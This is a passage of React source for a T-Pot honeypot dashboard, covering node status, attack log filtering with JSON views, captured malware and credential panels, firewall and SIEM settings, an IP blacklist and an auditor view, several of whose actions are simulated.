                    <RefreshCw size={13} />
                    <span>{getLoc('reboot_services')}</span>
                  </button>
                </div>
              </div>

              {/* Node table list */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl overflow-hidden shadow-2xl">
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-[#10141f] border-b border-gray-800 text-gray-400 font-bold uppercase text-[10px] tracking-wider">
                      <tr>
                        <th className="p-4">節點名稱</th>
                        <th className="p-4">本地 IP</th>
                        <th className="p-4">節點類型</th>
                        <th className="p-4">資源負載 (CPU / RAM / Disk)</th>
                        <th className="p-4">連線時間 Uptime</th>
                        <th className="p-4">運作狀態</th>
                        <th className="p-4 text-center">探針管理操控</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-850">
                      {nodes.map(node => (
                        <tr key={node.id} className="hover:bg-gray-900/30 transition-colors">
                          <td className="p-4 font-mono font-black text-white">
                            <div className="flex items-center gap-2">
                              <Server size={14} className={node.status === 'Online' ? "text-red-400" : "text-gray-600"} />
                              <span>{node.name}</span>
                            </div>
                          </td>
                          <td className="p-4 font-mono text-gray-300 select-all">{node.ip}</td>
                          <td className="p-4">
                            <span className={cn(
                              "text-[9px] font-mono font-black px-2 py-0.5 rounded border",
                              node.type === 'HIVE' 
                                ? "bg-purple-500/10 text-purple-400 border-purple-500/20" 
                                : "bg-blue-500/10 text-blue-400 border-blue-500/20"
                            )}>
                              {node.type}
                            </span>
                          </td>
                          <td className="p-4 space-y-1.5 min-w-[200px]">
                            {node.status === 'Offline' ? (
                              <span className="text-[10px] text-gray-500 italic">No telemetry diagnostic signals</span>
                            ) : (
                              <div className="space-y-1">
                                {/* CPU prog */}
                                <div className="flex items-center justify-between text-[9px] font-mono text-gray-500">
                                  <span>CPU</span>
                                  <span className={cn("font-bold", node.cpu > 80 ? "text-red-400" : "text-gray-300")}>{node.cpu}%</span>
                                </div>
                                <div className="w-full bg-black h-1 rounded-full overflow-hidden">
                                  <div 
                                    className={cn("h-full rounded-full", node.cpu > 80 ? "bg-red-500" : node.cpu > 50 ? "bg-amber-500" : "bg-[#10B981]")} 
                                    style={{ width: `${node.cpu}%` }} 
                                  />
                                </div>

                                {/* RAM prog */}
                                <div className="flex items-center justify-between text-[9px] font-mono text-gray-500">
                                  <span>RAM</span>
                                  <span className="text-gray-300">{node.ram}%</span>
                                </div>
                                <div className="w-full bg-black h-1 rounded-full overflow-hidden">
                                  <div className="bg-blue-500 h-full rounded-full" style={{ width: `${node.ram}%` }} />
                                </div>
                              </div>
                            )}
                          </td>
                          <td className="p-4 font-mono text-gray-400">{node.uptime}</td>
                          <td className="p-4">
                            <div className="flex items-center gap-1.5">
                              <span className={cn("w-2 h-2 rounded-full", node.status === 'Online' ? "bg-[#10B981] animate-pulse" : "bg-red-500")} />
                              <span className="font-mono text-[10px] font-bold">{node.status}</span>
                            </div>
                          </td>
                          <td className="p-4">
                            <div className="flex items-center justify-center gap-2">
                              {/* docker active components status */}
                              {node.status === 'Online' && (
                                <>
                                  <button
                                    onClick={() => openSimulatedTerminal(node)}
                                    className="px-2.5 py-1.5 bg-black hover:bg-gray-800 border border-gray-800 hover:border-red-500/20 text-[#10B981] hover:text-white rounded-lg font-mono text-[10px] font-bold transition-all flex items-center gap-1 cursor-pointer"
                                    title="Open Container Terminal shell connection"
                                  >
                                    <TerminalIcon size={12} />
                                    特權終端
                                  </button>

                                  <button
                                    onClick={() => handleRestartService(node.name, 'Cowrie')}
                                    disabled={currentUserRole === 'Analyst' || currentUserRole === 'Auditor'}
                                    className={cn(
                                      "px-2.5 py-1.5 rounded-lg text-[10px] font-bold transition-all",
                                      (currentUserRole === 'Analyst' || currentUserRole === 'Auditor')
                                        ? "bg-gray-950 text-gray-600 border border-transparent opacity-50 cursor-not-allowed"
                                        : "bg-gray-900 hover:bg-gray-850 border border-gray-800 text-gray-300 hover:text-white cursor-pointer"
                                    )}
                                    title={currentUserRole === 'Analyst' ? "分析師權限不足：按鈕已停用" : "稽核合規唯讀：按鈕已停用"}
                                  >
                                    重啟蜜罐
                                  </button>
                                </>
                              )}

                              {node.status === 'Offline' && (
                                <button
                                  onClick={() => {
                                    if (currentUserRole === 'Auditor') {
                                      showToast('稽核無權操作', 'warning');
                                      return;
                                    }
                                    showToast(`正在嘗試對節點 [${node.name}] 發送 Wake-On-LAN 遠端喚醒序列...`, 'info');
                                    setTimeout(() => {
                                      setNodes(prev => prev.map(x => x.id === node.id ? { ...x, status: 'Online', cpu: 12, ram: 28, uptime: '0h 1m' } : x));
                                      showToast(`節點 [${node.name}] 工組重連成功，Kibana 日誌對接收口恢復正常已在線。`, 'success');
                                      setLogs(prev => [{
                                        id: `SYS-${Date.now().toString().slice(-4)}`,
                                        time: new Date().toTimeString().split(' ')[0],
                                        node: 'SYSTEM',
                                        ip: '127.0.0.1',
                                        country: 'Localhost',
                                        countryCode: 'US',
                                        protocol: 'CLUSTER/Sync',
                                        honeypot: 'Elastic',
                                        payload: `NODE [${node.name}] reconnection telemetry heartbeat received`,
                                        severity: 'Medium',
                                        actionTaken: 'Trapped'
                                      }, ...prev]);
                                    }, 2000);
                                  }}
                                  className="px-2.5 py-1.5 bg-red-650/15 hover:bg-red-600 border border-red-500/30 text-white rounded-lg text-[10px] font-bold transition-all cursor-pointer flex items-center gap-1.5"
                                >
                                  <Wifi size={12} />
                                  遠端喚醒重連
                                </button>
                              )}

                              {/* Delete option only for admin */}
                              {currentUserRole === 'Admin' && (
                                <button
                                  onClick={() => {
                                    setNodes(prev => prev.filter(x => x.id !== node.id));
                                    showToast(`節點 [${node.name}] 與中央 Kibana Elasticsearch 資料關聯鏈已解除對接。`, 'danger');
                                  }}
                                  className="p-1.5 bg-gray-900 border border-gray-800 hover:border-red-500/20 text-gray-500 hover:text-red-400 rounded-lg transition-all cursor-pointer"
                                  title="移出節點"
                                >
                                  <Trash2 size={13} />
                                </button>
                              )}

                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

            </div>
          )}

          {/* TAB C: DEEP ANALYTICAL ATTACK EVENT RECORDS (LOGS) */}
          {activeTab === 'logs' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Filter controls row */}
              <div className="bg-[#0d1017] border border-gray-850 p-5 rounded-2xl space-y-4">
                
                <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between border-b border-gray-850 pb-3 gap-2">
                  <div className="flex items-center gap-2">
                    <Database className="text-red-400" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest font-mono text-white">
                      Elasticsearch Index Query Filters (攻擊防範進階日誌過濾)
                    </h3>
                  </div>
                  <span className="text-[10px] font-mono text-gray-500">
                    MATCHED COUNT: <span className="text-white font-bold">{filteredLogs.length} events</span>
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                  
                  {/* Select honeypots */}
                  <div>
                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">蜜罐協定組件</label>
                    <select
                      value={filterHoneypot}
                      onChange={(e) => setFilterHoneypot(e.target.value)}
                      className="w-full bg-black border border-gray-800 hover:border-gray-700 text-xs text-gray-300 rounded-xl p-2.5 outline-none font-bold"
                    >
                      <option value="All">全部 (All Components)</option>
                      <option value="Cowrie">Cowrie (SSH/Telnet)</option>
                      <option value="Dionaea">Dionaea (SMB/DB/MSSQL)</option>
                      <option value="Glastopf">Glastopf / Tanner (HTTP)</option>
                      <option value="Honeytrap">Honeytrap (SIP/Generic)</option>
                    </select>
                  </div>

                  {/* Select dynamic country */}
                  <div>
                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">攻擊來源國家</label>
                    <select
                      value={filterCountry}
                      onChange={(e) => setFilterCountry(e.target.value)}
                      className="w-full bg-black border border-gray-800 hover:border-gray-700 text-xs text-gray-300 rounded-xl p-2.5 outline-none font-bold"
                    >
                      <option value="All">所有國家 (Global Origins)</option>
                      <option value="China">China (中華人民共和國)</option>
                      <option value="Russia">Russia (俄羅斯聯邦)</option>
                      <option value="Germany">Germany (德國)</option>
                      <option value="United States">United States (美國)</option>
                      <option value="India">India (印度)</option>
                      <option value="Brazil">Brazil (巴西)</option>
                    </select>
                  </div>

                  {/* Export action list formats */}
                  <div>
                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">防火牆黑名單格式導出</label>
                    <div className="grid grid-cols-3 gap-2">
                      <button 
                        onClick={() => handleExportBlacklist('csv')}
                        className="px-2 py-2 bg-gray-900 border border-gray-800 hover:bg-gray-850 hover:border-[#10B981]/20 text-[10px] font-mono font-black text-white rounded-lg transition-all cursor-pointer flex items-center justify-center gap-1"
                      >
                        <Download size={11} /> CSV
                      </button>
                      <button 
                        onClick={() => handleExportBlacklist('json')}
                        className="px-2 py-2 bg-gray-900 border border-gray-800 hover:bg-gray-850 hover:border-[#10B981]/20 text-[10px] font-mono font-black text-white rounded-lg transition-all cursor-pointer flex items-center justify-center gap-1"
                      >
                        <Download size={11} /> JSON
                      </button>
                      <button 
                        onClick={() => handleExportBlacklist('stix')}
                        className="px-2 py-2 bg-gray-900 border border-gray-800 hover:bg-gray-850 hover:border-[#10B981]/20 text-[10px] font-mono font-black text-white rounded-lg transition-all cursor-pointer flex items-center justify-center gap-1"
                        title="STIX standard Indicators format"
                      >
                        <Download size={11} /> STIX
                      </button>
                    </div>
                  </div>

                  {/* Reset indicators */}
                  <div className="flex items-end">
                    <button
                      onClick={() => {
                        setFilterHoneypot('All');
                        setFilterCountry('All');
                        setGlobalSearch('');
                        showToast('所有日誌查詢篩選已清空還原。', 'info');
                      }}
                      className="w-full py-2.5 bg-gray-950 hover:bg-gray-900 border border-gray-850 hover:border-gray-700 text-xs font-bold text-gray-400 hover:text-white rounded-xl transition-all cursor-pointer flex items-center justify-center gap-1.5"
                    >
                      <RefreshCw size={12} />
                      <span>復位即時查詢條件</span>
                    </button>
                  </div>

                </div>

              </div>

              {/* Master logs tables / accordion listings */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl overflow-hidden shadow-2xl">
                
                <div className="p-4 bg-[#10141f] border-b border-gray-800 text-[10px] font-bold uppercase tracking-wider text-gray-400">
                  Kibana Normalization Event Logs (點擊單行可展開查看 JSON 原始日誌)
                </div>

                <div className="divide-y divide-gray-850">
                  {filteredLogs.length === 0 ? (
                    <div className="p-12 text-center text-gray-500 font-bold">
                      <ShieldAlert size={36} className="mx-auto text-gray-600 mb-3" />
                      沒有任何與篩選條件相匹配的蜜罐捕獲日誌數據。
                    </div>
                  ) : (
                    filteredLogs.map(log => {
                      const isExpanded = expandedLogId === log.id;
                      return (
                        <div key={log.id} className="transition-colors hover:bg-gray-900/10">
                          
                          {/* Log Main Title row click handler */}
                          <div 
                            onClick={() => setExpandedLogId(isExpanded ? null : log.id)}
                            className="p-4 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-4 cursor-pointer"
                          >
                            <div className="flex items-center gap-4">
                              <span className="text-[10px] font-mono text-gray-500 w-16">{log.time}</span>
                              <div className="flex items-center gap-2">
                                <span className="font-mono text-xs font-black text-white bg-black px-2 py-1 rounded border border-gray-850 select-all">{log.ip}</span>
                                <span className="text-[11px] text-gray-400">({log.country})</span>
                              </div>
                            </div>

                            <div className="flex items-center gap-5">
                              <div className="flex items-center gap-3 font-mono text-[10px]">
                                <span className="text-gray-500">Node:</span>
                                <span className="text-red-400 font-bold">{log.node}</span>
                                <span className="text-gray-500">Component:</span>
                                <span className="text-blue-400 font-bold">{log.honeypot}</span>
                              </div>

                              <div className="flex items-center gap-2">
                                <span className={cn(
                                  "text-[9px] font-mono font-black px-2 py-0.5 rounded",
                                  log.severity === 'Critical' ? "bg-red-500/15 text-red-400" :
                                  log.severity === 'High' ? "bg-orange-500/15 text-orange-400" : "bg-blue-500/15 text-blue-405"
                                )}>
                                  {log.severity}
                                </span>
                                
                                {isExpanded ? <ChevronUp size={14} className="text-gray-500" /> : <ChevronDown size={14} className="text-gray-500" />}
                              </div>
                            </div>

                          </div>

                          {/* Expanded JSON section drawer */}
                          <AnimatePresence>
                            {isExpanded && (
                              <motion.div
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: 'auto', opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                className="overflow-hidden bg-[#07090d] border-t border-gray-850"
                              >
                                <div className="p-5 space-y-4">
                                  
                                  {/* Custom Actions bar */}
                                  <div className="flex items-center justify-between border-b border-gray-900 pb-3">
                                    <div className="text-[10px] uppercase font-black text-[#10B981] font-mono tracking-widest flex items-center gap-1">
                                      <Activity size={12} />
                                      <span>Elastic Common Schema (ECS) Data Stream</span>
                                    </div>

                                    <div className="flex gap-2">
                                      {/* Block code action */}
                                      {currentUserRole !== 'Auditor' && (
                                        log.actionTaken !== 'Blocked' ? (
                                          <button
                                            onClick={() => handleBlockAddress(log.ip)}
                                            className="px-3 py-1.5 bg-red-650/10 hover:bg-red-600 border border-red-500/30 text-white rounded-lg text-[10px] font-bold transition-all cursor-pointer flex items-center gap-1"
                                          >
                                            <ShieldAlert size={12} />
                                            <span>{getLoc('logs_detail_btn_block')}</span>
                                          </button>
                                        ) : (
                                          <span className="px-3 py-1.5 bg-emerald-500/10 border border-emerald-500/20 text-[#10B981] rounded-lg text-[10px] font-mono font-black">
                                            {getLoc('logs_detail_blocked')}
                                          </span>
                                        )
                                      )}

                                      {/* copy raw json */}
                                      <button
                                        onClick={() => {
                                          navigator.clipboard.writeText(JSON.stringify(log, null, 2));
                                          showToast('已複製 Raw Log 原始日誌結構至剪貼簿！', 'success');
                                        }}
                                        className="px-3 py-1.5 bg-gray-900 border border-gray-800 hover:bg-gray-850 hover:border-gray-700 text-gray-300 rounded-lg text-[10px] font-bold transition-all cursor-pointer flex items-center gap-1"
                                      >
                                        <Copy size={12} />
                                        <span>複製 JSON</span>
                                      </button>
                                    </div>
                                  </div>

                                  {/* JSON Tree rendering */}
                                  <pre className="p-4 bg-black rounded-xl border border-gray-850 font-mono text-[11px] text-emerald-450 overflow-x-auto leading-relaxed max-h-[300px] select-text">
                                    {JSON.stringify({
                                      "@timestamp": new Date(`2026-06-12T${log.time}Z`).toISOString(),
                                      "agent": {
                                        "id": `${log.node.toLowerCase()}-docker`,
                                        "name": log.node,
                                        "type": "tpot-ingestor",
                                        "version": "24.04"
                                      },
                                      "source": {
                                        "ip": log.ip,
                                        "geo": {
                                          "country_name": log.country,
                                          "country_iso_code": log.countryCode
                                        }
                                      },
                                      "network": {
                                        "protocol": log.protocol.split('/')[0].toLowerCase(),
                                        "destination_port": parseInt(log.protocol.split('/')[1]) || 22
                                      },
                                      "event": {
                                        "category": "intrusion_attempt",
                                        "severity_keyword": log.severity,
                                        "original": log.payload,
                                        "honeypot_module": log.honeypot
                                      },
                                      "mitre_attack": {
                                        "technique": log.protocol.includes('22') ? ["T1110.001 - SSH Brute Force"] : ["T1190 - Exploit Public-Facing Application"]
                                      }
                                    }, null, 2)}
                                  </pre>

                                </div>
                              </motion.div>
                            )}
                          </AnimatePresence>

                        </div>
                      );
                    })
                  )}
                </div>

              </div>

            </div>
          )}

          {/* TAB D: CAPTURED MALWARE & USERNAME DICTIONARIES ANALYSIS */}
          {activeTab === 'malware' && (
            <div className="space-y-8 animate-fadeIn">
              
              {/* Top summary cards */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch">
                
                {/* 1. Captured Malicious Files (SHA256 Download samples) */}
                <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden flex flex-col justify-between">
                  <div className="absolute top-0 right-0 w-48 h-48 bg-[#FF3366]/2 rounded-full blur-3xl pointer-events-none"></div>
                  
                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-4">
                    <div className="flex items-center gap-2">
                      <Binary size={16} className="text-[#FF3366]" />
                      <h4 className="text-xs uppercase font-black font-mono tracking-wider text-white">
                        Dionaea Malware Binary Dropbox (在線蜜罐捕獲惡意程式下載樣本)
                      </h4>
                    </div>
                  </div>

                  <p className="text-[11px] text-gray-500 font-mono mb-4">
                    當駭客向蜜罐注入 wget / curl 載入威脅時，T-Pot 會自動靜態捕獲二進位執行檔並記錄 Hash 進行沙箱演練比對。
                  </p>

                  <div className="space-y-3">
                    {malware.map(item => (
                      <div key={item.id} className="p-3 bg-black/40 hover:bg-black/80 rounded-xl border border-gray-850 flex flex-col space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-mono font-black text-white select-all">{item.filename}</span>
                          <span className={cn(
                            "text-[8px] font-mono font-black px-1.5 py-0.5 rounded uppercase",
                            item.severity === 'Critical' ? "bg-red-500/10 text-red-400" : "bg-orange-500/10 text-orange-400"
                          )}>
                            {item.severity}
                          </span>
                        </div>
                        <div className="text-[9px] text-gray-500 font-mono truncate select-all">
                          SHA256: {item.sha256}
                        </div>
                        <div className="flex items-center justify-between pt-1 text-[9px] text-gray-400">
                          <span>大小: {item.size} • 誘捕時間: {item.time}</span>
                          <span className="text-[#FFB000] font-sans font-bold">{item.virusTotal}</span>
                        </div>
                      </div>
                    ))}
                  </div>

                </div>

                {/* 2. Top Login Dictionary attacker dictionary */}
                <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden flex flex-col justify-between">
                  <div className="absolute top-0 right-0 w-48 h-48 bg-blue-500/2 rounded-full blur-3xl pointer-events-none"></div>

                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-4">
                    <div className="flex items-center gap-2">
                      <Hash size={16} className="text-[#3B82F6]" />
                      <h4 className="text-xs uppercase font-black font-mono tracking-wider text-white">
                        Raw Credential Attack Trees (駭客常用弱密碼字典排行)
                      </h4>
                    </div>
                  </div>

                  <p className="text-[11px] text-gray-500 font-mono mb-4">
                    由 Cowrie-SSH 蜜罐採集，即時記錄其嘗試登陸時使用的帳密字典數據頻次。
                  </p>

                  <div className="space-y-2.5">
                    {credentials.map((cred, index) => (
                      <div key={cred.id} className="flex items-center justify-between text-xs font-mono p-2 bg-black/20 rounded-lg border border-gray-900">
                        <div className="flex items-center gap-3">
                          <span className="text-[10px] text-gray-500 font-bold w-4">#{index+1}</span>
                          <div className="flex gap-2 text-white">
                            <span className="bg-gray-900 border border-gray-850 px-2 py-0.5 rounded text-[11px] font-black">{cred.username}</span>
                            <span className="text-gray-500">:</span>
                            <span className="bg-gray-900 border border-gray-850 px-2 py-0.5 rounded text-[11px] text-red-300 font-bold">{cred.password}</span>
                          </div>
                        </div>
                        <div className="text-right">
                          <span className="text-[#00FF66] font-mono font-black">{cred.count.toLocaleString()}</span>
                          <span className="text-[9px] text-gray-500 block">嘗試次數</span>
                        </div>
                      </div>
                    ))}
                  </div>

                </div>

              </div>

            </div>
          )}

          {/* TAB E: MITIGATION AUTOMATION & CO-DEFENSE CONFIGS (SETTINGS) */}
          {activeTab === 'settings' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Mitigation automation configurations block */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/2 rounded-full blur-3xl pointer-events-none"></div>
                
                <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-6">
                  <div className="flex items-center gap-2">
                    <Sliders className="text-[#10B981]" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest font-mono text-white">
                      Edge Firewall Multi-linked Co-defense API Rules (邊緣防火牆自動化 API 聯防對接)
                    </h3>
                  </div>
                </div>

                <div className="space-y-6">
                  
                  {/* Toggle integration switches */}
                  <div className="flex items-center justify-between bg-black/40 p-4 rounded-xl border border-gray-850">
                    <div>
                      <span className="text-xs font-black text-white block">啟用全自動邊緣防禦聯防</span>
                      <span className="text-[10px] text-gray-500 font-mono mt-0.5">當蜜罐判斷核心威脅分值達 &gt;= 80 時，自動調用邊緣 FW API 實施永久 IP 阻斷。</span>
                    </div>

                    {/* Switch toggled state */}
                    <button
                      onClick={() => {
                        if (currentUserRole !== 'Admin') {
                          showToast('需要管理員權限才能更改全局自動防護開關。', 'warning');
                          return;
                        }
                        const next = !coDefendsActive;
                        setCoDefendsActive(next);
                        showToast(next ? '自動化聯防已就緒：威脅對接端口開啟監聽' : '聯防警報已解除，邊緣防火牆回調改為手動', 'info');
                      }}
                      className={cn(
                        "w-12 h-6 rounded-full p-1 transition-colors duration-200 cursor-pointer outline-none relative",
                        coDefendsActive ? "bg-[#10B981]" : "bg-gray-800"
                      )}
                    >
                      <span className={cn(
                        "w-4 h-4 rounded-full bg-black block absolute transition-all",
                        coDefendsActive ? "left-7" : "left-1"
                      )} />
                    </button>
                  </div>

                  {/* Config settings inputs fields */}
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    
                    <div>
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">Fortinet Gate Edge API Key</label>
                      <input 
                        type="password"
                        value={fortinetApiKey}
                        onChange={(e) => setFortinetApiKey(e.target.value)}
                        disabled={currentUserRole !== 'Admin'}
                        className="w-full bg-black border border-gray-800 hover:border-gray-700 focus:border-[#10B981]/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono tracking-wider transition-all font-bold disabled:opacity-40"
                      />
                    </div>

                    <div>
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">Palo Alto Endpoint Link</label>
                      <input 
                        type="text"
                        value={paloAltoEndpoint}
                        onChange={(e) => setPaloAltoEndpoint(e.target.value)}
                        disabled={currentUserRole !== 'Admin'}
                        className="w-full bg-black border border-gray-800 hover:border-gray-700 focus:border-[#10B981]/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono transition-all font-bold disabled:opacity-40"
                      />
                    </div>

                    <div>
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">SIEM Splunk Webhook Collector</label>
                      <input 
                        type="text"
                        value={splunkWebhook}
                        onChange={(e) => setSplunkWebhook(e.target.value)}
                        disabled={currentUserRole !== 'Admin'}
                        className="w-full bg-black border border-gray-800 hover:border-gray-700 focus:border-[#10B981]/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono transition-all font-bold disabled:opacity-40"
                      />
                    </div>

                  </div>

                  <div className="pt-4 border-t border-gray-900 flex justify-between items-center bg-black/10 p-4 rounded-xl border border-gray-900">
                    <div className="text-[10px] text-gray-500 font-mono">
                      ※ 系統會每 5 分鐘向 Splunk 集群進行蜜罐 telemetry 格式同步，GSSAPI 防禦鏈健全。
                    </div>
                    {currentUserRole === 'Admin' && (
                      <button
                        onClick={() => showToast('防火牆與 SIEM 安全認證握手成功！連通正常。', 'success')}
                        className="px-4 py-2 bg-[#10B981]/10 hover:bg-[#10B981]/20 border border-[#10B981]/30 text-[#10B981] text-xs font-bold rounded-xl transition-all cursor-pointer"
                      >
                        測試防火牆 API 握手連通
                      </button>
                    )}
                  </div>

                </div>
              </div>

              {/* Blacklisted IP list */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-48 h-48 bg-red-500/2 rounded-full blur-3xl pointer-events-none"></div>

                <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-4">
                  <div className="flex items-center gap-2">
                    <ShieldAlert size={16} className="text-red-400" />
                    <h3 className="text-xs uppercase font-black tracking-widest font-mono text-white">
                      Active IP Blacklist Store (目前在線攔截高危黑名單)
                    </h3>
                  </div>
                  <span className="text-[10px] font-mono text-gray-500">
                     總拦截數： {blacklistAddresses.length} IPs 
                  </span>
                </div>

                <p className="text-[11px] text-gray-500 font-mono mb-4">
                  下列 IP 是通過蜜罐分析自動捕獲，或者是安全人員手動指定的惡意源。其對應的入站流量都將在邊防網關直接丟棄 (DROP)。
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-3">
                  {blacklistAddresses.map(ip => (
                    <div key={ip} className="p-3 bg-black/40 rounded-xl border border-gray-850 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="w-1.5 h-1.5 rounded-full bg-red-500"></span>
                        <span className="text-xs font-mono font-bold text-white select-all">{ip}</span>
                      </div>
                      <button
                        onClick={() => handleRemoveFromBlacklist(ip)}
                        className="text-[10px] font-bold text-gray-500 hover:text-red-400 font-mono transition-colors cursor-pointer"
                        title="移出黑名單"
                      >
                        解封
                      </button>
                    </div>
                  ))}
                  
                  {/* Manual add input */}
                  {currentUserRole !== 'Auditor' && (
                    <div className="p-1 border border-dashed border-gray-800 rounded-xl flex items-center justify-between gap-2">
                      <input 
                        type="text" 
                        placeholder="手動新增攔截 IP..."
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') {
                            const val = e.currentTarget.value.trim();
                            if (val) {
                              handleBlockAddress(val);
                              e.currentTarget.value = '';
                            }
                          }
                        }}
                        className="bg-transparent border-none text-xs text-white outline-none w-full pl-2.5 font-mono"
                      />
                      <span className="text-[9px] text-gray-600 pr-2 uppercase font-black font-mono">ENTER鍵</span>
                    </div>
                  )}

                </div>

              </div>

              {/* Community Threat Feeds Config Card */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-500/2 rounded-full blur-3xl pointer-events-none"></div>
                
                <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-6">
                  <div className="flex items-center gap-2">
                    <Globe className="text-indigo-400" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest font-mono text-white">
                      {getLoc('hp_feeds_card_title')}
                    </h3>
                  </div>
                </div>
                
                <p className="text-[11px] text-gray-400 font-mono mb-6 leading-relaxed">
                  {getLoc('hp_feeds_card_desc')}
                </p>

                <div className="space-y-4">
                  {/* Switch 1: HPFeeds anonymous sharing */}
                  <div className="flex items-center justify-between bg-black/40 p-4 rounded-xl border border-gray-850">
                    <div>
                      <span className="text-xs font-black text-white block">{getLoc('toggle_hpfeeds')}</span>
                      <span className="text-[10px] text-gray-500 font-mono mt-0.5">SANS Internet Storm Center DShield telemetry payload transmitter.</span>
                    </div>
                    <button
                      onClick={() => {
                        if (currentUserRole !== 'Admin') {
                          showToast('需要管理員權限才能變更情資共享設定。', 'warning');
                          return;
                        }
                        const next = !hpfeedsSharingEnabled;
                        setHpfeedsSharingEnabled(next);
                        showToast(next ? 'HPFeeds 匿名共享已就緒：開始加密打包日誌上報' : 'HPFeeds 已停用：威脅分析將限於本網段', 'info');
                      }}
                      className={cn(
                        "w-12 h-6 rounded-full p-1 transition-colors duration-200 cursor-pointer outline-none relative flex-shrink-0",
                        hpfeedsSharingEnabled ? "bg-indigo-500" : "bg-gray-800"
                      )}
                    >
                      <span className={cn(
                        "w-4 h-4 rounded-full bg-black block absolute transition-all",
                        hpfeedsSharingEnabled ? "left-7" : "left-1"
                      )} />
                    </button>
                  </div>

                  {/* Switch 2: Global blacklist download sync */}
                  <div className="flex items-center justify-between bg-black/40 p-4 rounded-xl border border-gray-850">
                    <div>
                      <span className="text-xs font-black text-white block">{getLoc('toggle_intel_sync')}</span>
                      <span className="text-[10px] text-gray-500 font-mono mt-0.5">Sync DShield & Emerging Threats list hourly.</span>
                    </div>
                    <button
                      onClick={() => {
                        if (currentUserRole !== 'Admin') {
                          showToast('需要管理員權限才能啟用全球威脅情資防禦同步。', 'warning');
                          return;
                        }
                        const next = !threatFeedsAutoDownload;
                        setThreatFeedsAutoDownload(next);
                        showToast(next ? '黑名單動態更新：已自動取得今日 1,420 筆惡意 IP 規則' : '情資同步已停用。邊緣阻斷規則改為手動策略', 'info');
                      }}
                      className={cn(
                        "w-12 h-6 rounded-full p-1 transition-colors duration-200 cursor-pointer outline-none relative flex-shrink-0",
                        threatFeedsAutoDownload ? "bg-indigo-500" : "bg-gray-800"
                      )}
                    >
                      <span className={cn(
                        "w-4 h-4 rounded-full bg-black block absolute transition-all",
                        threatFeedsAutoDownload ? "left-7" : "left-1"
                      )} />
                    </button>
                  </div>
                </div>
              </div>

            </div>
          )}

          {/* TAB F: OPERATIONAL COMPLIANCE AUDIT LOGS (AUDITOR SPECIFIC VIEW) */}
          {activeTab === 'audit' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Auditor Warnings Banner */}
              <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-4 flex items-center justify-between gap-4">
                <div className="flex items-center gap-3">
                  <AlertTriangle className="text-amber-500 w-5 h-5 flex-shrink-0 animate-pulse" />
                  <div>
                    <span className="text-xs font-black text-amber-300 block">{getLoc('auditor_warning')}</span>
                    <span className="text-[10px] text-amber-400/80 font-mono mt-0.5 block">
                      Session compliance security key: SECURE-AUDIT-ECDSA-256-HASH. All actor trails are immutable.
                    </span>
                  </div>
                </div>
              </div>

              {/* Main table card */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-64 h-64 bg-[#FF3366]/2 rounded-full blur-3xl pointer-events-none"></div>

                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-gray-900 pb-4 mb-6">
                  <div>
                    <h3 className="text-sm font-black tracking-widest text-white flex items-center gap-2">
                      <FileText className="text-[#FF3366]" size={16} />
                      {getLoc('audit_header_title')}
                    </h3>
                    <p className="text-[10px] text-gray-500 font-mono mt-0.5 max-w-2xl leading-relaxed">
                      {getLoc('audit_header_desc')}
                    </p>
                  </div>

                  <button
                    onClick={() => {
                      showToast('正在預編譯與渲染安全審計軌跡... 已將 PDF 合規性報表自動下載至您的設備。', 'success');
                      
                      const reportContent = `========================================================================\n` +
                                            `         T-POT DECEPTION PLATFORM COMPLIANCE SECURITY AUDIT REPORT      \n` +
                                            `========================================================================\n` +
